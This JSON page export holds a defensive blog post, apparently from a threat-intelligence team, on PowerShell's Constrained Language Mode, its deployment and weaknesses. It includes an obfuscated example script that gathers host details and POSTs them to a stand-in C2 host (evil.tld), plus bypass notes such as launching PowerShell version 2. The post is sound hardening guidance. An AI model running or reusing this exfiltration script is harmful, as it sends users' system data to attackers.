{"pageProps":{"post":{"publish":true,"enable_form":false,"tags":[{"_id":"6018b953c56e80003f9859cb","name":"PowerShell","createdAt":"2021-02-02T02:30:43.906Z","updatedAt":"2021-02-02T03:54:49.732Z","__v":0,"id":"6018b953c56e80003f9859cb"},{"_id":"6018ccf4c56e80003f9859cc","name":"Constrained Language Mode","createdAt":"2021-02-02T03:54:28.919Z","updatedAt":"2021-02-05T02:54:38.296Z","__v":0,"id":"6018ccf4c56e80003f9859cc"}],"relative_posts":[],"_id":"6017c9aac56e80003f9859ba","post_url":"a-deep-dive-into-powershell-s-constrained-language-mode","post_name":"A Deep Dive into PowerShell's Constrained Language Mode","contents":[{"locale":"en","_id":"6017c9aac56e80003f9859bb","title":"A Deep Dive into PowerShell's Constrained Language Mode","context":"*Image courtesy of [Pexels](https://www.pexels.com/zh-tw/photo/3803517/)\n\n## What is Constrained Language Mode and Why it Matters\n\nWhen PowerShell was [first announced in 2006](https://betanews.com/2006/11/14/windows-powershell-1-0-released/), it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy `cmd.exe` in current Windows 10 releases.\n\nHowever, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and [APTs are known to abuse it whenever possible](https://attack.mitre.org/techniques/T1059/001/). The advanced scripting engine is often utilized to launch fileless/in-memory attacks or [use it as a way around AMSI](https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/). In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.\n\nPowerShell was launched with an option to change its [\"Language Mode\"](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes). This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with `FullLanguage`, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: `FullLanguage`, `RestrictedLanguage`, `NoLanguage` and finally `ConstrainedLanguage`. In today's topic, we are here to focus on the `ConstrainedLanguage` mode introduced in PowerShell 3.0.\n\n<br>\n\n### Safer PowerShell Environment\n\nFirst off, let's take a look at what Microsoft Docs says about the `ConstrainedLanguage` mode:\n\n> - All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.\n> - All elements of the PowerShell scripting language are permitted.\n> - All modules included in Windows can be imported and all commands that the modules export run in the session.\n> - In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.\n> - The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n> - The New-Object cmdlet can be used only on allowed types (listed below).\n> - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n> - Type conversion is permitted, but only when the result is an allowed type.\n> - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n> - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n> - Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:\n>   - Scripting.Dictionary\n>   - Scripting.FileSystemObject\n>   - VBScript.RegExp\n\n<br>\n\n#### No Arbitrary C# Code via Add-Type\n\n> The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.\n\nMany PowerShell-based exploits rely on .NET-based language compilation via `Add-Type` - and that's already thrown out the window by disallowing arbitrary C# code compilation.\n\n![202101-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png)\n\n<br>\n\n#### Non-whitelisted Types are Prohibited\n\n> - The New-Object cmdlet can be used only on allowed types (listed below).\n> - Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.\n> - Type conversion is permitted, but only when the result is an allowed type.\n> - Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.\n> - The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.\n\nIn laymen's terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as `System.Reflection.Assembly`/`System.Convert`/`System.Runtime.CompilerServices` and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.\n\n![202101-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png)\n\n<br>\n\n### Prohibit Complex Scripts from Executing\n\nGiven the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.\n\n![202101-3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png)\n\nConsequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.\n\n![202101-4.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png)\n\nTherefore, it is crucial to **double-check your organization's scripts** (if you have any) *before* enrolling this policy to your endpoints.\n\n<br>\n\n### Require Explicit Feature Enrollment\n\nSince, by default, this language mode is an opt-in feature, the user would either have to call `$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"` at the beginning of each session or add `__PSLockdownPolicy` to the system environment variables (**DO NOT** do this for production. [See the section below](#beware-of-pslockdownpolicy). Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.\n\nInstead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ *or* via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the [Application Control for Windows](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control) article on Microsoft Docs.\n\n<br>\n\n### Effective Against Scripts, not Standard Cmdlets\n\nIt must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.\n\nThe following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | &(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) > $null\n  # OSs + username collection\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | &(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) > $null\n  # WAN IP collection\n  &(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) > $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | &(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file\n  &(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station\n  &(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") > $null\n  &(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nAdditionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via `schtask` or placing additional payloads under `shell:startup`. Remember, Constrained Language mode does **NOT** block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.\n\n<br>\n\n#### Beware of `__PSLockdownPolicy`\n\nAside from weaponizing existing cmdlets, if the admins had \"enabled\" the language feature via `__PSLockdownPolicy`, then it would be trivial for attackers with administrative privileges to restore the language policy. Let's take a look at what this environment variable actually does.\n\n![202101-5.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png)\n\nWe'll see that it has brought us to the `SystemPolicy` class under the `wldpNativeMethods.cs` file. In various articles that reference this environment variable, they would instruct the administrator to set the `__PSLockdownPolicy` variable to `4`. A value of 4 corresponds with the `WLDP_LOCKDOWN_UMCIENFORCE_FLAG` constant, which indicates the enforcement of UMCI (User-mode Code Integrity).\n\n![202101-6.gif](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif)\n\nThe call's parent method happens to be named `GetDebugLockdownPolicy`, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.\n\n![202101-7.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png)\n\nThis theory is further backed up by the statement made by [Matt Graeber](https://twitter.com/mattifestation/status/921509830644269062), a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its [official post regarding Constrained Language Mode as well](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/):\n\n> As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called `__PSLockdownPolicy`. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.\n\nIt must be emphasized that administrators should **NOT** deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.\n\n<br>\n\n### Compatibility with Legacy OSs\n\nAnother thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.\n\n![202101-8.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png)\n\nWhile it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to *downgrade attacks*.\n\nAll the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using `PowerShell.exe -Version 2`. Since `ConstrainedLanguage` mode doesn't exist in that version, it will simply fallback to using `FullLanguage`.\n\n![202101-9.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png)\n\nThis is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using `Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`. After then, any attempts to launch PowerShell v2 will result in an error message.\n\n```text\nPS C:\\> powershell -v 2\nEncountered a problem reading the registry.  Cannot find registry key SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.\n```\n\n<br>\n\n## Hypothetical Testing\n\nTo see how effective this mode is against hypothetical attacks, we ...\n\n- gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.\n  - These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren't `*.ps1` scripts) in any way.\n- executed the scripts via `ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}`.\n- ran these samples on a system with `ConstrainedLanguage` mode enabled.\n- ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.\n  - Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.\n\n![202101-10.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png)\n\n<br>\n\nIn our testing,\n\n- `ConstrainedLanguage` blocked ...\n  - 100% (141/141) of the samples from executing properly.\n    - ... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.\n  - 51% (72/141) of the samples that had attempted to create a non-whitelisted type.\n  - 50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.\n  - 26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.\n  - 2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.\n- `ConstrainedLanguage` failed to block ...\n  - 0.7% (1/141) of the samples that had managed to create persistence entries.\n\n<br>\n\n## Conclusion\n\nSince PowerShell is now [an integral part](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f) of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.\n\nIn the article, we went through the benefits and drawbacks of `ConstrainedLanguage` and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.\n\n<br>\n","__v":0,"id":"6017c9aac56e80003f9859bb"}],"createdAt":"2021-02-01T09:28:10.609Z","updatedAt":"2021-02-17T01:50:50.646Z","__v":1,"author":{"confirmed":true,"blocked":false,"_id":"5eeae9e3163518003f86d917","username":"Cyber Threat Intelligence","email":"CTI@example.com","provider":"local","createdAt":"2020-06-18T04:13:23.063Z","updatedAt":"2020-06-19T03:42:43.966Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5eeae9e3163518003f86d917"},"topic":{"category":"blogs","_id":"5ecaa004a792d70040a0d8b0","color":"#64cda2","name":"Technical Analysis","createdAt":"2020-05-24T16:25:40.461Z","updatedAt":"2020-06-07T22:08:04.525Z","__v":0,"contents":[{"locale":"en","_id":"5edd6544bf58af004a15410d","text":"Technical Analysis","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410d"},{"locale":"tw","_id":"5edd6544bf58af004a15410e","text":"技術分析","createdAt":"2020-06-07T22:08:04.247Z","updatedAt":"2020-06-07T22:08:04.247Z","__v":0,"id":"5edd6544bf58af004a15410e"},{"locale":"jp","_id":"5edd6544bf58af004a15410f","text":"技術分析","createdAt":"2020-06-07T22:08:04.248Z","updatedAt":"2020-06-07T22:08:04.248Z","__v":0,"id":"5edd6544bf58af004a15410f"}],"id":"5ecaa004a792d70040a0d8b0"},"publish_date":"2021-02-17T02:00:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1612249236/pexels_brett_sayles_3803517_1c8f3c2bfa.jpg","been_relative_posts":[],"id":"6017c9aac56e80003f9859ba"}},"__N_SSG":true}